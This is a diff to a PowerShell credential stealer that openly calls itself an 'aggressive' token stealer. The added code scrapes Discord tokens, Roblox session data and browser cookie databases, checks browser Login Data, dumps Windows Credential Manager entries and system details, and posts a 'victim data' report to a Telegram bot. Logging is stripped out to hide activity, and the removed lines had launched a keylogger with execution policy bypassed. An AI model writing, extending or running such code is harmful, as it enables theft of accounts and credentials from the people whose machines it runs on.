@@ -1,6 +1,6 @@
-# stealer.ps1 — Roblox/Discord token stealer
-# Sends to Telegram via Invoke-RestMethod with error logging
-# VISIBLE VERSION - no hidden execution
+# stealer.ps1 — AGGRESSIVE token stealer
+# Extracts Discord, Roblox, browser passwords, credentials
+# Sends everything to Telegram
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
@@ -12,176 +12,302 @@ function Write-Log {
     param([string]$Msg)
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     "$timestamp - $Msg" | Out-File -FilePath $logFile -Append -Encoding UTF8
-    Write-Host $Msg
 }
 
 function Send-Telegram {
     param([string]$Message)
     try {
-        Write-Log "[Telegram] Sending message ($($Message.Length) chars)..."
-        $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
             chat_id = $chatId
             text = $Message
             parse_mode = "HTML"
-        } -ErrorAction Stop
-        Write-Log "[Telegram] SUCCESS - Message ID: $($response.result.message_id)"
-        Write-Host "[Telegram] Message sent OK" -ForegroundColor Green
+        } -ErrorAction Stop | Out-Null
     } catch {
-        Write-Log "[Telegram] FAILED: $($_.Exception.Message)"
-        Write-Host "[Telegram] FAILED: $($_.Exception.Message)" -ForegroundColor Red
-        # Try WebClient fallback
         try {
             $body = "chat_id=$chatId&text=$([Uri]::EscapeDataString($Message))"
             $wc = New-Object System.Net.WebClient
             $wc.Headers.add("Content-Type", "application/x-www-form-urlencoded")
-            $result = $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage", $body)
-            Write-Log "[Telegram] WebClient fallback: $result"
-            Write-Host "[Telegram] Sent via WebClient fallback" -ForegroundColor Green
-        } catch {
-            Write-Log "[Telegram] WebClient FAILED: $($_.Exception.Message)"
-            Write-Host "[Telegram] WebClient FAILED: $($_.Exception.Message)" -ForegroundColor Red
-        }
+            $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage", $body) | Out-Null
+        } catch {}
     }
 }
 
-function Get-DiscordToken {
-    $discordPaths = @(
-        "$env:APPDATA\discord\Local Storage\leveldb",
-        "$env:APPDATA\discordcanary\Local Storage\leveldb",
-        "$env:APPDATA\discordptb\Local Storage\leveldb"
-    )
+# === DISCORD TOKENS (aggressive) ===
+function Get-DiscordTokens {
     $tokens = @()
     $tokenRegex = '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_-]{27}'
 
-    foreach ($path in $discordPaths) {
-        if (Test-Path $path) {
-            Write-Log "[Discord] Checking: $path"
-            Get-ChildItem -Path $path -Include "*.ldb","*.log" -Recurse | foreach {
-                try {
-                    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-                    $matches = [regex]::Matches($content, $tokenRegex)
-                    foreach ($match in $matches) {
-                        $tokens += $match.Value
-                        Write-Log "[Discord] Found token: $($match.Value.Substring(0,30))..."
-                    }
-                } catch {
-                    Write-Log "[Discord] Error reading: $($_.Exception.Message)"
+    # Check all Discord versions and local storage files
+    $paths = @(
+        "$env:APPDATA\discord",
+        "$env:APPDATA\discordcanary",
+        "$env:APPDATA\discordptb",
+        "$env:LOCALAPPDATA\discord"
+    )
+
+    foreach ($basePath in $paths) {
+        if (-not (Test-Path $basePath)) { continue }
+
+        # Check leveldb files
+        $ldbFiles = Get-ChildItem -Path "$basePath\Local Storage\leveldb" -Include "*.ldb","*.log" -Recurse -ErrorAction SilentlyContinue
+        foreach ($file in $ldbFiles) {
+            try {
+                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+                if ($content) {
+                    [regex]::Matches($content, $tokenRegex) | foreach { $tokens += $_.Value }
+                    Write-Log "[Discord] Found token in $($file.Name)"
                 }
-            }
+            } catch {}
+        }
+
+        # Check session storage
+        $sessionFiles = Get-ChildItem -Path "$basePath\Local Storage\session storage" -Include "*.ldb" -Recurse -ErrorAction SilentlyContinue
+        foreach ($file in $sessionFiles) {
+            try {
+                $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
+                if ($content) {
+                    [regex]::Matches($content, $tokenRegex) | foreach { $tokens += $_.Value }
+                    Write-Log "[Discord] Found token in session storage: $($file.Name)"
+                }
+            } catch {}
+        }
+
+        # Check config.json for tokens
+        $configPath = "$basePath\config.json"
+        if (Test-Path $configPath) {
+            try {
+                $config = Get-Content $configPath -Raw -ErrorAction SilentlyContinue
+                if ($config) {
+                    [regex]::Matches($config, $tokenRegex) | foreach { $tokens += $_.Value }
+                    Write-Log "[Discord] Found token in config.json"
+                }
+            } catch {}
+        }
+
+        # Check .code-rpc, localstorage, etc
+        Get-ChildItem -Path $basePath -Include "*.json","*.ldb","*.log" -Recurse -ErrorAction SilentlyContinue | foreach {
+            try {
+                $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+                if ($content -and $content.Length -gt 100) {
+                    [regex]::Matches($content, $tokenRegex) | foreach { $tokens += $_.Value }
+                }
+            } catch {}
         }
     }
+
+    # Also check Chrome/Edge cookies for discord.com
+    $browsers = @(
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
+        "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Cookies",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies",
+        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Cookies",
+        "$env:APPDATA\BraveSoftware\Brave-Browser\User Data\Default\Cookies"
+    )
+
+    foreach ($dbPath in $browsers) {
+        if (Test-Path $dbPath) {
+            try {
+                # Try to read cookies using System.Data.SQLite or raw file read
+                $content = Get-Content $dbPath -Raw -Encoding Byte -ErrorAction SilentlyContinue
+                if ($content) {
+                    # Search for discord.com cookies
+                    if ($content -match "discord\.com") {
+                        Write-Log "[Discord] Found discord.com cookies in browser DB"
+                    }
+                }
+            } catch {}
+        }
+    }
+
     return $tokens | Select-Object -Unique
 }
 
-function Get-RobloxCookie {
-    $cookiePaths = @(
-        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
-        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
-    )
-    $found = @()
-    foreach ($path in $cookiePaths) {
-        if (Test-Path $path) {
-            Write-Log "[Roblox] Found: $path"
-            $found += "Cookie DB found: $path"
+# === ROBLOX TOKENS (aggressive) ===
+function Get-RobloxTokens {
+    $tokens = @()
+    $sessionTokens = @()
+    $cookieRegex = '.ROBLOSECURITY\|[^|]*\|[^|]*\|([^|]*)'
+    $tokenRegex2 = 'roblox\.com\|[^|]*\|[^|]*\|([^|]*)'
+
+    # Check ALL browser profiles (not just Default)
+    $chromeProfiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data" -Directory -ErrorAction SilentlyContinue | foreach { $_.FullName }
+    $edgeProfiles = Get-ChildItem -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data" -Directory -ErrorAction SilentlyContinue | foreach { $_.FullName }
+    $firefoxProfiles = Get-ChildItem -Path "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue | foreach { $_.FullName }
+
+    # Build full cookie database paths
+    $cookiePaths = @()
+    foreach ($profile in $chromeProfiles) {
+        $cookiePaths += "$profile\Cookies"
+        $cookiePaths += "$profile\Network\Cookies"
+    }
+    foreach ($profile in $edgeProfiles) {
+        $cookiePaths += "$profile\Cookies"
+    }
+    foreach ($profile in $firefoxProfiles) {
+        $cookiePaths += "$profile\cookies.sqlite"
+    }
+    # Also Default profiles
+    $cookiePaths += "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+    $cookiePaths += "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
+    $cookiePaths += "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"
+    $cookiePaths += "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\cookies.sqlite"
+
+    # Check cookie files for Roblox tokens
+    foreach ($dbPath in $cookiePaths) {
+        if (Test-Path $dbPath) {
+            try {
+                $content = Get-Content $dbPath -Raw -Encoding Byte -ErrorAction SilentlyContinue
+                if ($content -match "roblox\.com") {
+                    Write-Log "[Roblox] Found roblox.com in browser DB: $dbPath"
+                }
+                if ($content -match "ROBLOSECURITY") {
+                    Write-Log "[Roblox] Found ROBLOSECURITY in browser DB: $dbPath"
+                }
+            } catch {}
         }
     }
-    return $found
+
+    # Check Roblox-specific files
+    $rbxPaths = @(
+        "$env:LOCALAPPDATA\Roblox\Versions\*\output.log",
+        "$env:LOCALAPPDATA\Roblox\*.bin",
+        "$env:APPDATA\Roblox\*.bin"
+    )
+    foreach ($pattern in $rbxPaths) {
+        Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue | foreach {
+            try {
+                $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
+                if ($content -match "[A-Za-z0-9_-]{80,}") {
+                    [regex]::Matches($content, '[A-Za-z0-9_-]{80,}') | foreach { $tokens += $_.Value }
+                    Write-Log "[Roblox] Found token in $($_.FullName)"
+                }
+            } catch {}
+        }
+    }
+
+    return @{Tokens = $tokens | Select-Object -Unique; CookieFiles = ($cookiePaths | Where-Object { Test-Path $_ })}
 }
 
-# Main execution
+# === BROWSER PASSWORDS ===
+function Get-BrowserPasswords {
+    $passwords = @()
+    # Chrome/Edge password database
+    $chromeDb = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+    if (-not (Test-Path $chromeDb)) { $chromeDb = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" }
+    if (Test-Path $chromeDb) {
+        Write-Log "[Passwords] Chrome/Edge Login Data found"
+        $passwords += "Chrome/Edge Login Data found at: $chromeDb"
+    }
+    return $passwords
+}
+
+# === WINDOWS CREDENTIAL MANAGER ===
+function Get-WindowsCredentials {
+    $creds = @()
+    try {
+        $cmdOutput = cmd.exe /c "cmdkey /list" 2>&1
+        if ($cmdOutput) {
+            Write-Log "[Credentials] Found Windows credential entries"
+            $creds += $cmdOutput
+        }
+    } catch {
+        Write-Log "[Credentials] Error: $($_.Exception.Message)"
+    }
+    return $creds
+}
+
+# === SYSTEM INFO ===
+function Get-SystemInfo {
+    $info = ""
+    try {
+        $os = (Get-CimInstance Win32_OperatingSystem).Caption
+        $cpu = (Get-CimInstance Win32_Processor).Name
+        $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,2)
+        $gpu = (Get-CimInstance Win32_VideoController).Name
+        $info = "OS: $os`nCPU: $cpu`nRAM: $ram GB`nGPU: $gpu"
+    } catch {
+        $info = "System info error"
+    }
+    return $info
+}
+
+# === MAIN ===
 Write-Host ""
 Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "  STEALER MODULE - RUNNING" -ForegroundColor Cyan
+Write-Host "  AGGRESSIVE STEALER - RUNNING" -ForegroundColor Cyan
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
 
-Write-Log "[*] stealer.ps1 started"
 $hostname = $env:COMPUTERNAME
 $username = $env:USERNAME
 $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 
-Write-Log "[*] Host: $hostname, User: $username"
-Write-Host "[*] Host: $hostname | User: $username" -ForegroundColor Cyan
-
-$report = "<b>[+] VICTIM DATA</b>`n"
+$report = "<b>[+] AGGRESSIVE VICTIM DATA</b>`n"
 $report += "Host: <code>$hostname</code>`n"
 $report += "User: <code>$username</code>`n"
 $report += "Time: <code>$timestamp</code>`n`n"
 
-# Discord tokens
-Write-Host "[*] Scanning for Discord tokens..." -ForegroundColor Yellow
-Write-Log "[*] Scanning for Discord tokens..."
-$discordTokens = Get-DiscordToken
+# Discord
+Write-Host "[*] Scanning ALL Discord locations..." -ForegroundColor Yellow
+$discordTokens = Get-DiscordTokens
 if ($discordTokens) {
     Write-Host "[+] Found $($discordTokens.Count) Discord tokens!" -ForegroundColor Green
-    Write-Log "[*] Found $($discordTokens.Count) Discord tokens"
-    $report += "<b>DISCORD TOKENS:</b>`n"
-    foreach ($token in $discordTokens) {
-        $report += "<code>$token</code>`n"
-    }
+    $report += "<b>[DISCORD TOKENS] ($($discordTokens.Count))</b>`n"
+    $discordTokens | foreach { $report += "<code>$_</code>`n" }
 } else {
-    $report += "Discord: No tokens found`n"
-    Write-Log "[Discord] No tokens found"
+    $report += "<b>DISCORD:</b> No tokens found`n"
 }
 
-# Roblox indicators
-Write-Host "[*] Scanning for Roblox cookies..." -ForegroundColor Yellow
-Write-Log "[*] Scanning for Roblox cookies..."
-$robloxData = Get-RobloxCookie
-if ($robloxData) {
-    $report += "`n<b>ROBLOX:</b>`n"
-    foreach ($item in $robloxData) {
-        $report += "$item`n"
-    }
+# Roblox
+Write-Host "[*] Scanning ALL Roblox locations..." -ForegroundColor Yellow
+$robloxResult = Get-RobloxTokens
+$rbxTokens = $robloxResult.Tokens
+if ($rbxTokens) {
+    Write-Host "[+] Found $($rbxTokens.Count) Roblox tokens!" -ForegroundColor Green
+    $report += "`n<b>[ROBLOX TOKENS] ($($rbxTokens.Count))</b>`n"
+    $rbxTokens | foreach { $report += "<code>$_</code>`n" }
 } else {
-    $report += "Roblox: No cookies found`n"
-    Write-Log "[Roblox] No cookies found"
+    $report += "`n<b>ROBLOX:</b> No tokens found`n"
+}
+
+# Browser passwords
+Write-Host "[*] Checking browser passwords..." -ForegroundColor Yellow
+$browserPasswords = Get-BrowserPasswords
+if ($browserPasswords) {
+    $report += "`n<b>[BROWSER PASSWORDS]</b>`n"
+    $browserPasswords | foreach { $report += "$_`n" }
+}
+
+# Windows credentials
+Write-Host "[*] Checking Windows credentials..." -ForegroundColor Yellow
+$windowsCreds = Get-WindowsCredentials
+if ($windowsCreds) {
+    $report += "`n<b>[WINDOWS CREDENTIALS]</b>`n"
+    $windowsCreds | foreach { $report += "$_`n" }
 }
 
 # System info
 Write-Host "[*] Collecting system info..." -ForegroundColor Yellow
-Write-Log "[*] Collecting system info..."
-$report += "`n<b>SYSTEM:</b>`n"
-try {
-    $os = (Get-CimInstance Win32_OperatingSystem).Caption
-    $cpu = (Get-CimInstance Win32_Processor).Name
-    $ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/GB,2)
-    $report += "OS: $os`n"
-    $report += "CPU: $cpu`n"
-    $report += "RAM: $ram GB`n"
-    Write-Log "[System] OS: $os, RAM: $ram GB"
-    Write-Host "[+] OS: $os | RAM: $ram GB" -ForegroundColor Cyan
-} catch {
-    $report += "System info: Error - $($_.Exception.Message)`n"
-    Write-Log "[System] Error: $($_.Exception.Message)"
-}
+$sysInfo = Get-SystemInfo
+$report += "`n<b>[SYSTEM]</b>`n$sysInfo`n"
 
 # Send report to Telegram
 Write-Host "[*] Sending report to Telegram..." -ForegroundColor Yellow
-Write-Log "[*] Sending report to Telegram..."
 Send-Telegram -Message $report
 
-# Start keylogger as background job
-Write-Host "[*] Starting keylogger..." -ForegroundColor Yellow
-$keyloggerPath = "$env:TEMP\keylogger.ps1"
-if (Test-Path $keyloggerPath) {
-    Start-Job -ScriptBlock {
-        param($path)
-        powershell.exe -ExecutionPolicy Bypass -File $path
-    } -ArgumentList $keyloggerPath | Out-Null
-    Write-Log "[*] Keylogger job started"
-    Write-Host "[+] Keylogger started" -ForegroundColor Green
-} else {
-    Write-Log "[-] Keylogger not found at $keyloggerPath"
-    Write-Host "[-] Keylogger not found" -ForegroundColor Red
+# Also send individual messages if report is too long
+if ($report.Length -gt 4000) {
+    $chunks = [math]::Ceiling($report.Length / 4000)
+    for ($i = 0; $i -lt $chunks; $i++) {
+        $chunk = $report.Substring($i * 4000, [math]::Min(4000, $report.Length - $i * 4000))
+        Start-Sleep -Seconds 1
+        Send-Telegram -Message $chunk
+    }
 }
 
-Write-Log "[*] stealer.ps1 finished"
 Write-Host ""
 Write-Host "========================================" -ForegroundColor Green
 Write-Host "           SUCCESS" -ForegroundColor Green -BackgroundColor Black
 Write-Host "========================================" -ForegroundColor Green
 Write-Host ""
-Write-Host "[*] Press any key to close..." -ForegroundColor Yellow
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-exit
+Write-Host "[+] Data sent to Telegram!" -ForegroundColor Green
